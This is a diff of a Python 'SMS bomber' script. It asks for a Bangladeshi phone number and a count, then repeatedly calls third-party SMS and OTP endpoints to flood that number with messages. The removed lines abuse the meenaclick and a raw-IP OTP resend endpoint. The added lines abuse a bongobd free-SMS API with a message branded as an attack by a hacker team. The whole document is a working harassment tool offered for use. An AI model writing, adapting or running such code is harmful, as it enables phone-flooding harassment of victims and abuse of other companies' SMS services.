@@ -1,5 +1,4 @@
 import requests
-from requests.structures import CaseInsensitiveDict
 
 green = '\033[1;32m'
 end = '\033[0m'
@@ -13,26 +12,10 @@ print (green+"""  _   _ ____    ____  _   _       _  ___ _ ____
 number  = str(input("[>] Enter The BD Number: "))
 amount = int(input("[>] Enter The Amount: "))
 
-url1 = "https://api.meenaclick.com/api/front/sms/send/pin?'"
+url = "http://crux.bongobd.com/api/SMS/SendFreeSMS?msisdn=88"+number+"&sms=iTz%20CirCLe%20(CHAT%20INVITER)%20aTTacK%20By%20(SiiLenT%20HunTer)%20TeaM%20&sc=16443"
 
-headers1 = CaseInsensitiveDict()
-headers1["Content-Type"] = "application/x-www-form-urlencoded"
+for i in range(amount):
 
-data1 = "cell_phone="+number
+	resp = requests.get(url)
 
-
-url2 = "http://128.199.215.102/api/otpresend"
-
-headers2 = CaseInsensitiveDict()
-headers2["Content-Type"] = "application/x-www-form-urlencoded"
-
-data2 = "phone="+number
-
-
-for j in range(amount):
-	
-	resp1 = requests.post(url1, headers=headers1, data=data1)
-	
-	resp2 = requests.post(url2, headers=headers2, data=data2)
-	
-	print (str(j+1)+" SMS SenT yOur aTTaCk NuMBer")
+	print(str(i+1)+" SMS Sent")
